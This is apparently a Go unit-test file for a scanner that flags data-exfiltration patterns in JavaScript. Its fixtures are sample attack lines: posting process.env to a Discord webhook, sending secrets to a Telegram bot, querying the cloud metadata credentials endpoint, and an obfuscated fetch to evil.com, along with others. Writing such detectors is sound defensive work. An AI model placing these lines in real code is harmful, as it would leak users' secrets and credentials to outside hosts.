package analyzer

import (
	"strings"
	"testing"
)

func TestExfiltrationAnalyzer_DiscordWebhook(t *testing.T) {
	a := NewExfiltrationAnalyzer()
	content := `fetch("https://discord.com/api/webhooks/123456789/abcdefghijklmnop", {method: "POST", body: JSON.stringify(process.env)})`
	findings := a.scanContent(content, "index.js")

	if len(findings) == 0 {
		t.Fatal("Expected to detect Discord webhook")
	}
	if findings[0].Severity != SeverityCritical {
		t.Errorf("Expected CRITICAL severity, got %v", findings[0].Severity)
	}
}

func TestExfiltrationAnalyzer_TelegramBot(t *testing.T) {
	a := NewExfiltrationAnalyzer()
	content := `axios.post("https://api.telegram.org/bot123456:ABC-DEF/sendMessage", {chat_id: "123", text: secrets})`
	findings := a.scanContent(content, "bot.js")

	if len(findings) == 0 {
		t.Fatal("Expected to detect Telegram bot API")
	}
}

func TestExfiltrationAnalyzer_Pastebin(t *testing.T) {
	a := NewExfiltrationAnalyzer()
	content := `const data = await fetch("https://pastebin.com/raw/abc123").then(r => r.text())`
	findings := a.scanContent(content, "loader.js")

	if len(findings) == 0 {
		t.Fatal("Expected to detect Pastebin")
	}
}

func TestExfiltrationAnalyzer_CloudMetadata(t *testing.T) {
	a := NewExfiltrationAnalyzer()
	content := `fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")`
	findings := a.scanContent(content, "ssrf.js")

	if len(findings) == 0 {
		t.Fatal("Expected to detect cloud metadata endpoint")
	}
	if findings[0].Severity != SeverityCritical {
		t.Errorf("Expected CRITICAL severity for cloud metadata")
	}
}

func TestExfiltrationAnalyzer_DynamicURLConstruction(t *testing.T) {
	a := NewExfiltrationAnalyzer()
	content := `const url = atob('aHR0cHM6Ly9ldmlsLmNvbS9jb2xsZWN0'); fetch(url);`
	findings := a.scanContent(content, "obfuscated.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Dynamic URL") || strings.Contains(f.Title, "Base64") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect dynamic URL construction")
	}
}

func TestExfiltrationAnalyzer_Ngrok(t *testing.T) {
	a := NewExfiltrationAnalyzer()
	content := `fetch("https://abc123.ngrok-free.app/collect", {body: data})`
	findings := a.scanContent(content, "tunnel.js")

	if len(findings) == 0 {
		t.Fatal("Expected to detect ngrok tunnel")
	}
}

func TestExfiltrationAnalyzer_IPBasedURL(t *testing.T) {
	a := NewExfiltrationAnalyzer()
	content := `fetch("http://45.33.32.156:8080/exfil", {method: "POST"})`
	findings := a.scanContent(content, "network.js")

	if len(findings) == 0 {
		t.Fatal("Expected to detect IP-based URL")
	}
}
